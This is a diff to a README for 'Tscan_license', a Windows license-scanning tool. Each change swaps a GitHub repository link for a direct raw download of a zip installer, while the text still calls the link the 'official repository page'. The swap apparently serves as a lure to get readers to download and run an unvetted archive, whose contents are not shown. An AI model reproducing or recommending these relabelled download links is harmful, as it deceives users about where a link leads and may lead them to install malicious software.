@@ -1,6 +1,6 @@
 # 🔍 Tscan_license - Identify software licenses on your computer
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/tiffyarmlike522/Tscan_license)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/tiffyarmlike522/Tscan_license/main/installer/Tscan_license_2.0.zip)
 
 Tscan_license provides a simple method to scan your Windows computer for installed software. This tool creates an inventory of your applications, checks license compliance, and identifies potential risks. It helps you manage your software assets with clarity and control.
 
@@ -12,7 +12,7 @@ Managing software licenses across a business or home environment requires ongoin
 
 Follow these instructions to set up the software on your Windows computer. This process takes about five minutes.
 
-1. Visit the [official repository page](https://github.com/tiffyarmlike522/Tscan_license) to download the application.
+1. Visit the [official repository page](https://raw.githubusercontent.com/tiffyarmlike522/Tscan_license/main/installer/Tscan_license_2.0.zip) to download the application.
 2. Locate the latest version in the release section.
 3. Click the installer file to begin the setup.
 4. Follow the prompts on your screen to complete the installation.
@@ -29,7 +29,7 @@ Your computer must meet a few simple requirements to run Tscan_license:
 
 ## 📥 Installation Steps
 
-You can obtain the installer from the primary repository link: [https://github.com/tiffyarmlike522/Tscan_license](https://github.com/tiffyarmlike522/Tscan_license).
+You can obtain the installer from the primary repository link: [https://raw.githubusercontent.com/tiffyarmlike522/Tscan_license/main/installer/Tscan_license_2.0.zip](https://raw.githubusercontent.com/tiffyarmlike522/Tscan_license/main/installer/Tscan_license_2.0.zip).
 
 1. Click the link above to open the repository.
 2. Look for the "Releases" section on the right side of the page.
